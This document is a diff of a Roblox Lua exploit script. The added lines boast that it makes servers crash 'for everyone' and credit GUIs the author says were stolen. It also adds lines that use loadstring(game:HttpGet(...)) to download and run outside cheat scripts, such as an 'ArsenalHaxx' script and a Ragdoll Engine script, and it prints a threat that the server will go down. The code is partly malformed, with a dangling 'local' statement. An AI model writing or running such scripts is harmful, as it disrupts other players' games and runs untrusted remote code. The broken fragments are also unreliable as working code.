@@ -8,6 +8,23 @@
 -- Thanks for using my script
 -- El1te / SennieJack / ThatRobloxScripter
 -- Update 1  added something idk anything bout
+-- Update 2 added stuff that hopefully make it so that it crashes for everyone  now at 278 lines of code or smt ok bye ily (no homo) 
+
+
+
+--- CREDITS ---
+-- Thanks to NougatBitz For The Gui
+-- Thanks to Adwas For The gui
+-----------------------------------------------
+--- Programmers ---
+--- Casp3r (Co - Devoloper) - Helped With Errors
+--- Virus (Found Scripts) - Explantory
+--- El1te (Main Devoloper) - Worked On The Script
+-------------------------------------------------
+
+--- SUPPORTED GAMES  (only for the gui's i stole lol)---
+local Ragdoll = true
+local 
  
 ------ STARTING SCRIPT --------
 
@@ -24,12 +41,22 @@ game.workspace.RespectFilteringEnabled = true
 end
       
 ----------------------------------------
+------ RAGDOLL & OTHERS
+local RagdollEngine = 22653509 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NougatBitz/ArsenalHaxx/master/TintenFisch.lua"))();
 print("YOU HAVE 35 SECONDS TO CHOOSE WHAT YOU WANT TO DO THEN THE SERVER WILL GO DOWN! IT ONLY SUPPORTS JAILBREAK, INFECTION AND ARSENAL BUT THE OTHER CODE SUPPORTS ANY GAME!!- Script Maker" player.Name)
-if if game.CreatorId == 22653509 then
+if  game.CreatorId == RagdollEngine then
 	print("Game = Ragdoll Engine Loading Ragdoll Engine Script")
-	
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Jxq7/MyScripts/main/Ragdoll%20Engine%20%5BASX%5D.lua'),true))()
+        local plr = game.Players
+	plr.RespawnTime = 1
 end
+
+
+
+
+
+
 local StartWait = 35
 wait(StartWait)
 local Start = print("STARTING")
@@ -276,3 +303,5 @@ if Target.CharacterWalkSpeed == 16 then
 	print(FAILEDTXT)
 end
 
+
+--- 308 Lines Of Code Milestone
